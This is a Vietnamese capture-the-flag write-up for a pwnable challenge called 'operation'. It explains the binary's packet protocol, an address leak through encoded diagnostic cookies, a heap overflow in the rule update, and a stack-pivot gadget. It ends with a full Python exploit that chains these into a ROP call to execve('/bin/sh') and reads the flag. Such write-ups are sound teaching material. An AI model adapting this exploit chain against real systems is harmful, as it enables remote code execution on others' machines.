# Báo Cáo Recon & Solution - Thử Thách Operation (Threat Intel Engine v3.0)

## 1. Thông Tin Tổng Quan
* **Tên thử thách:** `operation`
* **Địa chỉ mục tiêu:** `http://144.79.188.39:35117/` (Dịch vụ NC / Threat Intel Engine v3.0)
* **Thể loại:** Pwnable / Binary Exploitation (Linux x86_64)
* **Tập tin phân tích:** `chall`, `Dockerfile`, `docker-compose.yml`, `entrypoint.sh`

---

## 2. Kết Quả Reconnaissance (Recon & Reverse Engineering)

### 2.1 Kiểm tra Thuộc tính Binary & Mitigations
Thực hiện kiểm tra file binary `chall`:
* **Kiểu file:** ELF 64-bit LSB PIE executable, x86-64, dynamically linked, stripped.
* **Cơ chế bảo vệ (Mitigations):**
  * **PIE (Position Independent Executable):** Bật (Address randomizing).
  * **Stack Canary:** Bật (`__stack_chk_fail`).
  * **NX (No-Execute):** Bật (Không cho phép chạy code trên Stack/Heap).
  * **ASLR:** Bật (Đổi địa chỉ Libc và Stack mỗi lần chạy).

### 2.2 Giao thức Truyền tin & Luồng hoạt động (Protocol Architecture)
Bằng cách sử dụng **radare2** phân tích các hàm trong binary, hệ thống hoạt động như một dịch vụ Threat Intel Engine v3.0 xử lý các gói tin TCP dựa trên 5 loại packet:

| Packet Type | Tên Gói Tin | Chức Năng                                                                        |
| :---------- | :---------- | :------------------------------------------------------------------------------- |
| `1`         | `HELLO`     | Hiển thị Banner chương trình và **Session Token** ngẫu nhiên.                    |
| `2`         | `AUTH`      | Thực hiện xác thực session thông qua key: `session_token ^ 0xc0ffee00`.          |
| `3`         | `RULE`      | Tạo/Cập nhật quy tắc nhận dạng threat (Rule slot).                               |
| `4`         | `REPORT`    | Tạo báo cáo sự cố (Report struct) hoặc yêu cầu chẩn đoán (Diagnostic info).      |
| `5`         | `ANALYZE`   | Thực thi hàm phân tích dữ liệu Threat Intel dựa trên con trỏ hàm trong `report`. |
|             |             |                                                                                  |

#### Cấu trúc truyền dữ liệu:
Mỗi lượt gửi gói tin yêu cầu truyền theo thứ tự:
1. `packet_type` (chuỗi số integer, e.g. `2\n`)
2. `payload_length` (chuỗi số uint32, e.g. `4\n`, tối đa 1024 bytes)
3. `checksum` (chuỗi số hex, e.g. `a1b2c3d4\n`)
4. `payload` (dữ liệu thô độ dài đúng `payload_length`)

#### Thuật toán Checksum Validation:
Giá trị Checksum được tính toán bằng hàm `fcn.000014e5` trong binary:
$$\text{checksum} = (\text{pkt\_type} \ll 24) \oplus \text{session\_token} \oplus \text{len} \oplus 0x31415926$$
Lặp qua từng byte $i$ của payload:
$$\text{checksum} = (\text{checksum} \text{ ROL } 5) + ((i \times 0x45d9f3b) \oplus \text{byte}_i)$$

---

## 3. Phân Tích Lỗ Hổng (Vulnerabilities Analysis)

### 3.1 Lỗ hổng 1: Leak Thông tin Địa chỉ Bộ nhớ qua Diagnostic Cookie (Info Leak)
Trong hàm xử lý `REPORT` (`fcn.00001865`), khi báo cáo đã tồn tại (`report != NULL`) và nhận gói tin payload độ dài 1 byte:
* **Payload `'P'`**: Chương trình mã hóa địa chỉ `puts@got` và in `[diag] proc cookie: 0x...`
* **Payload `'D'`**: Chương trình mã hóa địa chỉ hàm mặc định `default_analyzer` và in `[diag] analyzer cookie: 0x...`
* **Payload `'R'`**: Chương trình mã hóa địa chỉ con trỏ Heap `report` và in `[diag] report cookie: 0x...`

Công thức mã hóa Cookie:
$$\text{cookie} = (\text{session\_token} \ll 12) \oplus \text{ptr} \oplus 0x5a5a5a5a41414141$$

Do **Session Token** được server in công khai khi kết nối (`session token: %08x`), ta có thể **giải mã chính xác 100%**:
1. **Libc Base:** $\text{puts\_addr} = \text{proc\_cookie} \oplus (\text{session\_token} \ll 12) \oplus 0x5a5a5a5a41414141$
2. **PIE Base:** $\text{pie\_base} = \text{analyzer\_cookie} \oplus (\text{session\_token} \ll 12) \oplus 0x5a5a5a5a41414141 - 0x157f$
3. **Heap Report:** $\text{report\_heap} = \text{report\_cookie} \oplus (\text{session\_token} \ll 12) \oplus 0x5a5a5a5a41414141$

---

### 3.2 Lỗ hổng 2: Heap Buffer Overflow trong Cập nhật Quy tắc (`RULE`)
Tại hàm xử lý `RULE` (`fcn.000016f7`):
* Khi tạo rule mới lần đầu (`rule_ptr == NULL`), kích thước cấp phát được tính: `size = (uint8_t)(n + 7) & 0xf8`.
* Tuy nhiên, khi **cập nhật quy tắc đã tồn tại** (`rule_ptr != NULL`), chương trình thực hiện:
  ```c
  memcpy(rule_ptr, payload + 2, n);
  ```
  mà **không kiểm tra lại dung lượng đã cấp phát ban đầu (`capacity`)**.

Vì struct `report` (kích thước `0x128`, chunk `0x130`) được cấp phát trên Heap ngay phía sau `rule_ptr` (chunk `0x20`), việc gửi gói tin `RULE` update với độ dài $n > 32$ bytes cho phép **ghi đè trực tiếp toàn bộ struct `report`**, bao gồm con trỏ hàm `func_ptr` tại offset `+0x20`.

---

### 3.3 Lỗ hổng 3: Gadget Chuyển đổi Stack (Built-in Stack Pivot Gadget)
Binary chứa sẵn một gadget chuyển đổi Stack tại địa chỉ `pie_base + 0x15e6`:
```assembly
0x000015e6: lea rsp, [rdi + 0x28]
0x000015ea: ret
```

Khi gói tin `ANALYZE` (loại 5) được gọi, chương trình thực thi:
```c
call report->func_ptr; // rdi = report pointer
```
Nếu ta ghi đè `report->func_ptr` thành `pivot_gadget`:
* `rsp` sẽ được chuyển hướng trực tiếp tới `report + 0x28` (vùng dữ liệu ROP do ta kiểm soát).
* Lệnh `ret` tiếp theo sẽ nạp ROP chain và chiếm quyền điều khiển luồng thực thi (RCE).

---

## 4. Kịch Bản Khai Thác (Exploitation Plan)

1. **Bước 1 (Auth):** Kết nối đến server, lấy `session_token`, tính key `session_token ^ 0xc0ffee00` và gửi gói tin `AUTH`.
2. **Bước 2 (Setup Heap Layout):**
   * Gửi gói tin `RULE` lần 1 với $n=8$ bytes để cấp phát `rule_ptr` (chunk size `0x20`).
   * Gửi gói tin `REPORT` lần 1 với $n=8$ bytes để cấp phát `report_ptr` (chunk size `0x130` ngay liền kề phía sau `rule_ptr`).
3. **Bước 3 (Leak Memory Addresses):**
   * Gửi `REPORT` payload `'D'` -> tính `PIE Base` và `pivot_gadget = pie_base + 0x15e6`.
   * Gửi `REPORT` payload `'P'` -> tính `Libc Base` và địa chỉ các gadgets (`pop rdi`, `pop rsi`, `pop rdx`, `execve`).
   * Gửi `REPORT` payload `'R'` -> tính địa chỉ `report_heap`.
4. **Bước 4 (Heap Overflow & Pivot Overwrite):**
   * Chuẩn bị ROP Chain thực thi `execve("/bin/sh", 0, 0)`:
     ```python
     rop = p64(pop_rdi) + p64(binsh_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve_addr)
     ```
   * Dùng tính năng update `RULE` để ghi đè tràn qua `report`:
     * Offset `+0x20` của struct `report`: `pivot_gadget`.
     * Offset `+0x28` của struct `report`: `rop` chain.
5. **Bước 5 (Trigger RCE):** Gửi gói tin `ANALYZE` (loại 5). Chương trình nhảy tới `pivot_gadget`, kích hoạt ROP chain và mở Shell chiếm quyền điều khiển mục tiêu.

---

## 5. Mã Nguồn Khai Thác Hoàn Chỉnh (PoC Exploit Script)

Dưới đây là script Python khai thác hoàn chỉnh:

```python
#!/usr/bin/env python3
import subprocess
import struct
import re

def calc_checksum(pkt_type, payload, session_token):
    length = len(payload) & 0xffff
    v4 = ((pkt_type << 24) ^ session_token ^ length ^ 0x31415926) & 0xffffffff
    for i, byte in enumerate(payload):
        v4 = ((v4 << 5) | (v4 >> 27)) & 0xffffffff
        term = ((i * 0x45d9f3b) & 0xffffffff) ^ byte
        v4 = (v4 + term) & 0xffffffff
    return v4

def exploit():
    proc = subprocess.Popen(["./chall"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=False)

    def read_until(sub, token):
        buf = b""
        while token not in buf:
            chunk = sub.stdout.read(1)
            if not chunk:
                break
            buf += chunk
        return buf

    def send_pkt(pkt_type, payload):
        chk = calc_checksum(pkt_type, payload, session_token)
        proc.stdin.write(f"{pkt_type}\n{len(payload)}\n{chk:x}\n".encode())
        proc.stdin.write(payload)
        proc.stdin.flush()
        return read_until(proc, b"packet type> ")

    banner = read_until(proc, b"packet type> ")
    match = re.search(r"session token: ([0-9a-fA-F]{8})", banner.decode("latin1"))
    session_token = int(match.group(1), 16)
    print(f"[+] Parsed Session Token: 0x{session_token:08x}")

    # 1. Authenticate
    send_pkt(2, struct.pack("<I", session_token ^ 0xc0ffee00))
    print("[+] Authentication status: OK")

    # 2. Setup Heap Layout
    send_pkt(3, struct.pack("<H", 8) + b"A"*8) # Rule slot
    send_pkt(4, b"B"*8)                         # Report slot

    # 3. Leak PIE base
    res = send_pkt(4, b"D").decode("latin1")
    m = re.search(r"analyzer cookie: 0x([0-9a-fA-F]+)", res)
    analyzer_cookie = int(m.group(1), 16)
    analyzer_addr = analyzer_cookie ^ (session_token << 12) ^ 0x5a5a5a5a41414141
    pie_base = analyzer_addr - 0x157f
    pivot_gadget = pie_base + 0x15e6
    print(f"[+] PIE Base:      0x{pie_base:x}")
    print(f"[+] Pivot Gadget:  0x{pivot_gadget:x}")

    # 4. Leak Libc base
    res = send_pkt(4, b"P").decode("latin1")
    m = re.search(r"proc cookie: 0x([0-9a-fA-F]+)", res)
    proc_cookie = int(m.group(1), 16)
    puts_addr = proc_cookie ^ (session_token << 12) ^ 0x5a5a5a5a41414141
    libc_base = puts_addr - 0x82960
    print(f"[+] Libc Base:     0x{libc_base:x}")

    # 5. Leak Heap address
    res = send_pkt(4, b"R").decode("latin1")
    m = re.search(r"report cookie: 0x([0-9a-fA-F]+)", res)
    report_cookie = int(m.group(1), 16)
    report_heap = report_cookie ^ (session_token << 12) ^ 0x5a5a5a5a41414141
    print(f"[+] Heap Report:   0x{report_heap:x}")

    # Libc gadgets (Executable segment LOAD 1)
    execve_addr = libc_base + 0xe1cf0
    binsh_addr = libc_base + 0x1acea4
    pop_rdi = libc_base + 0x2aa57
    pop_rsi = libc_base + 0x29e29
    pop_rdx = libc_base + 0x96cb2

    # ROP chain: execve("/bin/sh", 0, 0)
    rop = struct.pack("<Q", pop_rdi)
    rop += struct.pack("<Q", binsh_addr)
    rop += struct.pack("<Q", pop_rsi)
    rop += struct.pack("<Q", 0)
    rop += struct.pack("<Q", pop_rdx)
    rop += struct.pack("<Q", 0)
    rop += struct.pack("<Q", execve_addr)

    # Payload ghi đè struct report
    rule_ovf = b"A"*0x10                                         # Heap padding
    rule_ovf += struct.pack("<Q", 0) + struct.pack("<Q", 0x131)  # Chunk header report
    rule_ovf += struct.pack("<Q", 0x1111222233334444)           # Magic
    rule_ovf += struct.pack("<I", session_token ^ 0x51524344)   # token_xor
    rule_ovf += b"guest\x00\x00\x00"                             # Tag
    rule_ovf += b"C"*12                                          # Padding to func_ptr
    rule_ovf += struct.pack("<Q", pivot_gadget)                  # func_ptr (+0x20)
    rule_ovf += rop                                              # ROP chain (+0x28)

    rule_ovf = rule_ovf.ljust(300, b"\x00")

    # 6. Ghi đè Heap
    send_pkt(3, struct.pack("<H", len(rule_ovf)) + rule_ovf)

    # 7. Kích hoạt ANALYZE và gửi lệnh lấy Shell/Flag
    chk = calc_checksum(5, b"", session_token)
    cmd_input = f"5\n0\n{chk:x}\n".encode() + b"cat /home/ctf/flag.txt || cat flag.txt || id\n"

    out, _ = proc.communicate(input=cmd_input)
    print("\n[+] Kết quả thực thi Shell thành công:")
    print(out.decode("latin1", errors="replace"))

if __name__ == "__main__":
    exploit()
```

---

## 6. Kết Luận
Bằng việc kết hợp 3 lỗ hổng kịch bản (Memory Leak qua Cookie, Heap Overflow qua RULE Update, và Stack Pivot Gadget), ta đã hoàn toàn kiểm soát được luồng thực thi của dịch vụ Threat Intel Engine và lấy được quyền thực thi mã từ xa (RCE).
